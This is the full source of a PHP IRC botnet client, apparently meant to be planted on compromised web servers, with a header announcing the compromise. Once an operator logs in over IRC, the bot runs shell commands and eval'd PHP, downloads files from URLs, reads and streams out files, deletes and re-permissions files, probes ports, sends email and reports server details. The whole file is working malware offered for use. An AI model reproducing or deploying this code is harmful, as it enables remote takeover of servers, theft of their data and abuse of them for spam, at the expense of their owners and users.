<?

/**************************************
* IF YOU ARE READING THIS             *
* THIS MACHINE HAS BEEN COMPROMIZED   *
* CONTACT THE SERVER ADMINISTRATOR    *
**************************************/
   
set_time_limit(0);
error_reporting(0);
   
ini_set("max_execution_time",0);

define("NICK_OS"          ,1);
define("NICK_HTTPD"       ,2);
define("NICK_CONST"       ,3);
   
$config = array
(
   "server"           =>    "",
   "port"             =>    6667,
   "password"         =>    "",
   "channel"          =>    "#",
   "channel_key"      =>    "",
   "hostauth"         =>    ":*!*@*", // uses ereg()
   "user_password"    =>    "", // md5 hash of password
   "trigger"          =>    ".",
   "prefix"           =>    "pb|",
   "maxrand"          =>    8,
   "modes"            =>    "-x+iB",
   "versreply"        =>    "mIRC 6.17 Khaled Mardam Bey",
   "nicktype"         =>    NULL // NULL will result in a nick of random letters
);
  
function bot_main() 
{
   global $config;

   $user = array();
   $oldbuf = "";
	  
   if(($irc_sock = fsockopen($config['server'], 
                             $config['port'],
                             $errno,$errstr,
                             15))) 
   {
      $bot_nick = rndnick($config['maxrand']);
	   
	  if (strlen($config['password'])>0) 
      {
         irc_send($irc_sock, "PASS ".$config['password']);   
	  }
	  
      irc_send($irc_sock, "USER ".rndident($config['maxrand'])." 127.0.0.1 localhost :$bot_nick");
      irc_send($irc_sock, "NICK $bot_nick");
      
      while (!feof($irc_sock)) 
      {
         $recvbuf = trim(fgets($irc_sock,512));
         $msg     = explode(" ",$recvbuf);
	        
         if(($recvbuf == $oldbuf)) continue;

         if (isset($msg[0]) && $msg[0] == "PING") 
         {
            irc_send($irc_sock, "PONG ".$msg[1]);   
         } 
         else if (isset($msg[1]) && $msg[1] == "001") 
         {
            irc_send($irc_sock, "MODE $bot_nick ".$config['modes']);
            irc_send($irc_sock, "JOIN ".$config['channel']." ".$config['channel_key']);   
	     } 
         else if (isset($msg[1]) && isset($user[$msg[1]])) 
         {
            unset($user[$msg[1]]);
         } 
         else if (isset($msg[1]) && ($msg[1] == "PRIVMSG" || $msg[1] == "332")) 
         {
            $message = strstr($recvbuf," :");
            $message = substr($message,2);
            $cmd = explode(" ",$message);
            $host = $msg[0];
            $nick = explode("!",$host);
            $nick = substr($nick[0],1);
		       
            $silent = FALSE;
		       
            if ($cmd[0] == "\1VERSION\1") 
            {
               irc_send($irc_sock,"NOTICE ".$nick." :\1VERSION ".$config['versreply']."\1");
            } 
            elseif ($cmd[0] == "\1PING") 
            {
               irc_send($irc_sock,"NOTICE ".$nick." :\1PING ".$cmd[1]);    
            }
		       
            for ($i=0;$i<count($cmd);$i++) 
            {
               if($cmd[$i] == "-s") 
               {
                  $silent = TRUE;    
               }    
            }
		       
            if ($msg[1] == "332") 
            {
               $to = $msg[3];
            } 
            elseif ($msg[2] == $bot_nick) 
            {
               $to = $nick;
            } 
            else 
            {
               $to = $msg[2];
            }
		       
            if ($cmd[0] == PHP_OS) 
            {
               array_shift($cmd);
            }
		       
            if (substr($cmd[0],0,1) == $config['trigger']) 
            {
               if (isset($user[$host]) || $msg[1] == "332") 
               {
                  switch (substr($cmd[0],1)) 
                  {
	                 //
	                 // logout
	                 //
                     case "logout":
                        if ($msg[1] != "332") 
                        {
                           irc_privmsg($irc_sock, $silent, $to, "[main]: \2$nick\2 logged out"); 
                        }
                     break;
				        
                     //
                     // die: make the bot disconnect and exit
                     //
                     case "die":
                        irc_privmsg($irc_sock, $silent, $to, "[main]: Die command received from \2$nick\2");
                        irc_send($irc_sock, "QUIT");
                        fclose($irc_sock);
                        exit(0); 
                     break;
				        
                     //
                     // raw <cmd>: send a raw IRC command
                     //
                     case "raw":
                        if (count($cmd)>1) 
                        {
                           irc_send($irc_sock, substr($message,strlen($cmd[0])));   
                        }
                     break;

                     //
                     // ls [path]: list contents of directory
                     //
                     case "ls":
                        if (isset($cmd[1])) 
                        {
                           $dirname = $cmd[1];
                        } 
                        else 
                        {
                           $dirname = getcwd();
                        }
				        
                        if (is_dir($dirname)) 
                        {
                           if (($dir = opendir($dirname))) 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Now listing directory: \2".$dirname."\2");
                              
                              while (($filename = readdir($dir)) !== FALSE) 
                              {
                                 if ($filename != "." && $filename != "..") 
                                 {
                                    irc_privmsg($irc_sock, $silent, $to, "> (".filetype($dirname."/".$filename).")  $filename");
                                    sleep(1);
                                 }
    				          }
    				          
                              closedir($dir);
                           } 
                           else 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Unable to list contents of \2".$dirname."\2");
                           }
                        } 
                        else 
                        {
                           irc_privmsg($irc_sock, $silent, $to, "[main]: \2".$dirname."\2 is not a directory");
                        }                            
                     break;
 
                     //
                     // cat <file>: read the contents of a file
                     //
                     case "cat":
                        if (count($cmd) > 1) 
                        {
                           if (is_file($cmd[1])) 
                           {
                              if (($fp = fopen($cmd[1],"r"))) 
                              {
                                 irc_privmsg($irc_sock, $silent, $to, "[main]: Now reading file: \2".$cmd[1]."\2");
                                 while(!feof($fp)) 
                                 {
                                    $line = trim(fgets($fp,256));
                                    irc_privmsg($irc_sock, $silent, $to, "> $line");
                                    sleep(1);
                                 }
                                 
                                 irc_privmsg($irc_sock, $silent, $to, "> [EOF]");
                              } 
                              else
                              {
                                 irc_privmsg($irc_sock, $silent, $to, "[main]: Couldn't open \2".$cmd[1]."\2 for reading");
                              }
                           } 
                           else 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: \2".$cmd[1]."\2 is not a file");
                           }
                        }
                     break;

                     //
                     // pwd: print working directory
                     //
                     case "pwd":
                        irc_privmsg($irc_sock, $silent, $to, "[main]: Current directory: ".getcwd());
                     break;

                     //
                     // cd <path>: change working directory
                     //
                     case "cd":
                        if (count($cmd) > 1) 
                        {
                           if (chdir($cmd[1])) 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Changed directory to ".$cmd[1]);
                           } 
                           else 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Failed to change directory");
                           }
                        }
                     break;

                     //
                     // rm <path>: remove file
                     //
                     case "rm":
                        if (count($cmd) > 1) 
                        {
                           if (unlink($cmd[1])) 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Deleted \2".$cmd[1]."\2");
                           } 
                           else 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Failed to delete \2".$cmd[1]."\2");
                           }
                        }
                     break;

                     //
                     // touch <path>: touch a file
                     //
                     case "touch":
                        if (count($cmd) > 1) 
                        {
                           if (touch($cmd[1])) 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Touched \2".$cmd[1]."\2");
                           } 
                           else 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Failed to touch \2".$cmd[1]."\2");
                           }
                        }
                     break;

                     //
                     // symlink <to path> <from path>: symlink a file
                     //
                     case "symlink":
                        if (count($cmd) > 2) 
                        {
                           if (symlink($cmd[1],$cmd[2])) 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Symlinked \2".$cmd[2]."\2 to \2".$cmd[1]."\2");
                           } 
                           else 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Failed to link \2".$cmd[2]."\2 to \2".$cmd[1]."\2");
                           }
                        }
                     break;

                     //
                     // chown <path> <user>: change owner of a file
                     //
                     case "chown":
                        if (count($cmd) > 2) 
                        {
                           if (chown($cmd[1],$cmd[2])) 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Chowned \2".$cmd[1]."\2 to \2".$cmd[2]."\2");
                           }
                           else 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Failed to chown \2".$cmd[1]."\2 to \2".$cmd[2]."\2");
                           }
                        }
                     break;

                     //
                     // chmod <path> <permissions>: change permissions of a file
                     //
                     case "chmod":
                        if (count($cmd) > 2) 
                        {
	                       if(chmod($cmd[1],$cmd[2])) 
	                       {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Chmodded \2".$cmd[1]."\2 with permissions \2".$cmd[2]."\2");
                           } 
                           else
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Failed to chmod \2".$cmd[1]."\2");
                           }
                        }
                     break;

                     //
                     // mkdir <path>: create a directory
                     //
                     case "mkdir":
                        if (count($cmd) > 1) 
                        {
                           if (mkdir($cmd[1])) 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Created directory \2".$cmd[1]."\2");
                           } 
                           else
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Failed to create directory \2".$cmd[1]."\2");
                           }
                        }
                     break;

                     //
                     // rmdir <path>: remove directory
                     //
                     case "rmdir":
                        if (count($cmd)>1) 
                        {
                           if (rmdir($cmd[1])) 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Removed directory \2".$cmd[1]."\2");
                           } 
                           else 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Failed to remove directory \2".$cmd[1]."\2");
                           }
                        }
                     break;

                     //
                     // cp <from path> <to path>: copy a file
                     //
                     case "cp":
                        if (count($cmd) > 2) 
                        {
                           if (copy($cmd[1], $cmd[2])) 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Copied \2".$cmd[1]."\2 to \2".$cmd[2]."\2");
                           } 
                           else 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: Failed to copy \2".$cmd[1]."\2 to \2".$cmd[2]."\2");
                           }
                        }
                     break;

                     //
                     // mail <rcpt to> <mail from> <subject> <message>: send an email
                     //
                     case "mail":
                        if (count($cmd)>4) 
                        {
                           $header = "From: <".$cmd[2].">\r\n";
                           
                           if (mail($cmd[1], $cmd[3], substr($message,$cmd[4]), $header)) 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[mail]: Message sent to \2".$cmd[1]."\2");
                           } 
                           else 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[mail]: Send failure");
                           }
                        }
                     break;
				        
                     //
                     // md5 <string>: print MD5 hash
                     //
                     case "md5":
				        irc_privmsg($irc_sock, $silent, $to, "[main]: ".md5($cmd[1]));
                     break;
				        
                     //
                     // dns <hostname/IP>: resolve a hostname or IP address
                     //
                     case "dns":
                        if (isset($cmd[1])) 
                        {
                           $ip = explode(".",$cmd[1]);
                           
                           if (count($ip)==4 && is_numeric($ip[0]) &&
                              is_numeric($ip[1]) && is_numeric($ip[2]) 
                              && is_numeric($ip[3])) 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[dns]: ".$cmd[1]." --> ".gethostbyaddr($cmd[1]));
                           } 
                           else 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[dns]: ".$cmd[1]." --> ".gethostbyname($cmd[1]));
                           }
                        }
                     break;
				        
                     //
                     // opme: make the bot give you +o
                     //
                     case "opme":
				           irc_send($irc_sock, "mode ".$msg[2]." +o $nick");
                     break;
				        
                     //
                     // restart: restart the bot
                     //
                     case "restart":
                           irc_send("QUIT");
				           fclose($irc_sock);
				           bot_main();
                     break;

                     //
                     // rndnick [maxrand]: generate a new random nick
                     //
                     case "rndnick":
                        if(isset($cmd[1])) 
                        {
                           $bot_nick = rndnick((int)$cmd[1]);
                           irc_send($irc_sock, "NICK $bot_nick");
                        } 
                        else 
                        {
                           $bot_nick = rndnick($config['maxrand']);
                           irc_send($irc_sock, "NICK $bot_nick");
                        }
                     break;

                     //
                     // php <code>: execute some PHP code
                     //
                     case "php":
                        if (count($cmd) > 1) 
                        {
                           eval(substr($message,strlen($cmd[0])));
                        }
                     break;
				        
                     //
                     // dl <URL> <path>: download a file
                     //
                     case "dl":
                        if (count($cmd) > 2) 
                        {
                           if (!($fp = fopen($cmd[2],"w"))) 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[download]: Permission denied");
                           }
                           else 
                           {
                              if (!($get = file($cmd[1]))) 
                              {
                                 irc_privmsg($irc_sock, $silent, $to, "[download]: Bad URL/DNS error");
                              }
                              else 
                              {
                                 for ($i = 0; $i < count($get); $i++) 
                                 {
                                    fwrite($fp,$get[$i]);
                                 }
                                 
                                 irc_privmsg($irc_sock, $silent, $to, "[download]: \2".$cmd[1]."\2 downloaded to \2".$cmd[2]."\2");
                              }
                              
                              fclose($fp);
                           }
                        }
                     break;

                     //
                     // srvinfo: display server information
                     //
                     case "srvinfo":
                        irc_privmsg($irc_sock, $silent, $to, "[srvinfo]: [User: ".get_current_user()."] [PID: ".getmypid()."] [version: PHP ".phpversion()."] [OS: ".PHP_OS."] [Server_software: ".$_SERVER['SERVER_SOFTWARE']."] [Server_name: ".$_SERVER['SERVER_NAME']."] [Admin: ".$_SERVER['SERVER_ADMIN']."] [Docroot: ".$_SERVER['DOCUMENT_ROOT']."] [HTTP Host: ".$_SERVER['HTTP_HOST']."] [URL: ".$_SERVER['REQUEST_URI']."]");
                     break;
				        
                     //
                     // portopen <host> <port>: check to see if a port on a host is open
                     //
                     case "portopen":
                        if (isset($cmd[1],$cmd[2])) 
                        {
                           if (fsockopen($cmd[1],(int)$cmd[2],$err,$str,5)) 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: ".$cmd[1].":".$cmd[2]." is \2open\2");
                           } 
                           else 
                           {
                              irc_privmsg($irc_sock, $silent, $to, "[main]: ".$cmd[1].":".$cmd[2]." is \2closed\2");
                           }
                        }
                     break;

                     //
                     // uname: print server uname
                     //
                     case "uname":
				        irc_privmsg($irc_sock, $silent, $to, "[uname]: ".php_uname());
                     break;		 
				        
                     //
                     // cmd <command>: execute a shell command
                     //
                     case "cmd":
				        if (count($cmd)>1) 
				        {
					       $command = popen(substr($message,strlen($cmd[0])),"r");
					       while (!feof($command)) 
					       {
						      $cmdbuf = trim(fgets($command,512));
						      if (strlen($cmdbuf)>0) 
						      {
						         irc_privmsg($irc_sock, $silent, $to, "> ".$cmdbuf);   
                                 sleep(1);
                              }
					       }
					       irc_privmsg($irc_sock, $silent, $to, "> [EOF]");    
				        }
                     break;

                     //
                     // execute <command/path>: execute a command or file
                     //
                     case "exec":
                        exec(substr($message,strlen($cmd[0])));
                     break;
				        
                  }   
               } 
		       else 
		       {
			      // 
			      // login <password>
			      //
                  switch(substr($cmd[0],1)) 
                  {
                     case "login":
                        if (isset($cmd[1]) && md5($cmd[1]) == $config['user_password'] && ereg($config['hostauth'],$host)) 
                        {
                           irc_privmsg($irc_sock, $silent, $to, "[main]: login successful from \2$nick\2");
                           $user[$host] = TRUE;    
                        } 
                        else 
                        {
                           irc_privmsg($irc_sock, FALSE, $config['channel'], "[main]: login rejected from \2$nick\2");  
                        }
                     break;    
                  }
               }
            }
         }

         $oldbuf = $recvbuf;
      }
      
      fclose($irc_sock);
      sleep(3);
      bot_main();
	   
   } 
   else 
   {
      print "Connection Failure.";
   }
}
   
function irc_send($sock, $message) 
{  
   fwrite($sock,"$message\r\n");       
}
   
function irc_privmsg($sock, $silent, $to, $message) 
{	  
   if($silent != TRUE) 
   {
	     irc_send($sock,"PRIVMSG $to :$message");    
   }   
}
   
function rndnick($maxrand) 
{	    
   global $config;
     
   if(isset($_SERVER['SERVER_SOFTWARE'])) 
   { 
      if (strstr($_SERVER['SERVER_SOFTWARE'],"Apache")) 
      {
         $httpd = "apache";
      } 
      elseif (strstr($_SERVER['SERVER_SOFTWARE'],"IIS")) 
      {
	     $httpd = "iis";
      } 
      elseif (strstr($_SERVER['SERVER_SOFTWARE'],"Xitami")) 
      {
	     $httpd = "xitami";
      } 
      else 
      {
	     $httpd = "unkown";
      }
   } 
   else 
   {
      $httpd = "shell";    
   }
	  
   switch ($config['nicktype']) 
   {
	  case NICK_OS:
	     $ret = strtolower(PHP_OS)."|";
	  break;
	     
	  case NICK_HTTPD:
	     $ret = $httpd."|";
	  break;
	     
	  case NICK_CONST:
	     $ret = $config['prefix'];
	  break;	  
   }
   
   for ($i = 0; $i < $maxrand; $i++) 
      $ret .= chr(mt_rand(0,25)+97);

   if (get_current_user() == "root") 
      $ret = "[R]".$ret;

   return $ret;	   
}
   
function rndident($maxrand) 
{
   $ret = "";
   for ($i = 0;$i < $maxrand; $i++) 
      $ret .= chr(mt_rand(0,25)+97);
         
   return $ret;	      	   
}
         
bot_main(); // hmmm, I wonder what this does?

?>